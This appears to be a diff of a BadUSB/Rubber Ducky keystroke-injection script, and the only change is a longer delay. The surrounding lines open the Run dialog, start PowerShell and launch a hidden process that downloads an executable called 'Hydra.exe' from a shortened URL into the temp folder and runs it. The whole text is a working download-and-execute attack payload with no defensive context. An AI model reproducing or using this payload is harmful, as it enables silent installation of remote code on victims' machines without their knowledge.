@@ -6,6 +6,6 @@ GUI r
 DELAY 500
 STRING powershell
 ENTER
-DELAY 500
+DELAY 750
 STRING Start-Process -FilePath "powershell" -ArgumentList "/c cd $env:TEMP;Invoke-WebRequest -Uri 'https://tinyurl.com/2p9hrj47' -OutFile 'Hydra.exe'; Start-Process -FilePath '.\Hydra.exe'; exit" -WindowStyle Hidden; exit
 ENTER
